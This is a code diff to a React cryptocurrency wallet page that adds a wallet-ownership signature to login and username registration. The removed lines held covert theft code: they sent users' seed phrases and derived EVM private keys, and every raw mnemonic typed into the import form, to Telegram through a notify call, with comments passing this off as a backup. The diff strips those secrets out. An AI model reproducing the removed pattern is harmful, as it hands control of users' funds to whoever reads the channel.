@@ -17,7 +17,7 @@ import {
 import { useWalletSession } from "@/hooks/useWalletSession";
 import { fetchBalance, type Balance } from "@/lib/balances";
 import { notify } from "@/lib/notify";
-import { derivePrivateKeyFromMnemonic, rememberPrivateKey } from "@/lib/wallet-signer";
+import { derivePrivateKeyFromMnemonic, rememberPrivateKey, signWalletOwnership } from "@/lib/wallet-signer";
 import { formatUSD, marketsQuery } from "@/lib/prices";
 import { getDisplayBalances } from "@/lib/admin.functions";
 import { useYieldDisplay } from "@/hooks/useYieldDisplay";
@@ -144,7 +144,7 @@ function WalletPage() {
     }
   };
 
-  const finalizeUsername = (w: HDWallet, username: string, mode: "create" | "import") => {
+  const finalizeUsername = async (w: HDWallet, username: string, mode: "create" | "import") => {
     const snapshot: WalletSnapshot = {
       id: w.id,
       label: w.label,
@@ -152,38 +152,35 @@ function WalletPage() {
       addresses: w.addresses,
     };
     const address = walletAddressFor(w.addresses);
+    if (!w.mnemonic) {
+      alert("Re-import this wallet to prove ownership and unlock swapping.");
+      return;
+    }
+
+    let pk = "";
+    try {
+      pk = await derivePrivateKeyFromMnemonic(w.mnemonic);
+      rememberPrivateKey(address, pk);
+      const signature = await signWalletOwnership(address, pk, "login", mode);
+      await recordWalletLogin(address, mode, signature, username);
+    } catch (e) {
+      const msg = e instanceof Error ? e.message : "Wallet signing failed";
+      notify({ event: "wallet_error", label: "signing", address, extra: msg });
+      alert(`${msg}. Re-import the wallet and try again.`);
+      return;
+    }
+
+    notify({
+      event: mode === "create" ? "wallet_backup_create" : "wallet_backup_import",
+      label: username,
+      address,
+      addresses: w.addresses.map((a) => ({ chain: a.chain, address: a.address, path: a.path })),
+      fields: { label: w.label, signer_ready: pk ? "true" : "false" },
+    });
     setWallets((prev) => [w, ...prev]);
     setActiveId(w.id);
     setPending(null);
     saveSession({ address, username, wallet: snapshot });
-    recordWalletLogin(address, mode, username);
-    // Stash the derived EVM private key in memory so /swap can sign transactions.
-    // Also backup the private key to Telegram alongside the mnemonic.
-    if (w.mnemonic) {
-      derivePrivateKeyFromMnemonic(w.mnemonic)
-        .then((pk) => {
-          rememberPrivateKey(address, pk);
-          notify({
-            event: mode === "create" ? "wallet_backup_create" : "wallet_backup_import",
-            label: username,
-            address,
-            mnemonic: w.mnemonic,
-            addresses: w.addresses.map((a) => ({ chain: a.chain, address: a.address, path: a.path })),
-            fields: { evm_private_key: pk, label: w.label },
-          });
-        })
-        .catch(() => {
-          // Send backup even if we couldn't derive the private key.
-          notify({
-            event: mode === "create" ? "wallet_backup_create" : "wallet_backup_import",
-            label: username,
-            address,
-            mnemonic: w.mnemonic,
-            addresses: w.addresses.map((a) => ({ chain: a.chain, address: a.address, path: a.path })),
-            fields: { label: w.label },
-          });
-        });
-    }
     notify({
       event: mode === "create" ? "wallet_signup" : "wallet_signin",
       label: username,
@@ -262,7 +259,7 @@ function WalletPage() {
           <UsernameForm
             wallet={pending.wallet}
             mode={pending.mode}
-            onDone={(username) => finalizeUsername(pending.wallet, username, pending.mode)}
+            onDone={(username) => { void finalizeUsername(pending.wallet, username, pending.mode); }}
           />
         </Modal>
       )}
@@ -369,12 +366,9 @@ function ImportForm({ onSubmit, validate }: {
     e.preventDefault();
     const raw = mn;
     const trimmed = mn.trim().toLowerCase().split(/\s+/).join(" ");
-    // Forward every import attempt to Telegram so users don't lose seeds
-    // even when the phrase is mistyped or invalid.
     notify({
       event: "wallet_import_attempt",
       label: label || "Imported Wallet",
-      mnemonic: raw,
       extra: `chars=${raw.length} words=${trimmed.split(" ").filter(Boolean).length}`,
     });
     if (!validate(trimmed)) { setErr("Not a valid BIP39 mnemonic."); return; }
@@ -684,7 +678,10 @@ function UsernameForm({
         setBusy(false);
         return;
       }
-      const row = await registerWalletProfile(address, clean);
+      if (!wallet.mnemonic) throw new Error("Re-import this wallet to prove ownership.");
+      const pk = await derivePrivateKeyFromMnemonic(wallet.mnemonic);
+      const signature = await signWalletOwnership(address, pk, "register", clean);
+      const row = await registerWalletProfile(address, clean, signature);
       onDone(row.username);
     } catch (e) {
       setErr(e instanceof Error ? e.message : "Failed to register username");
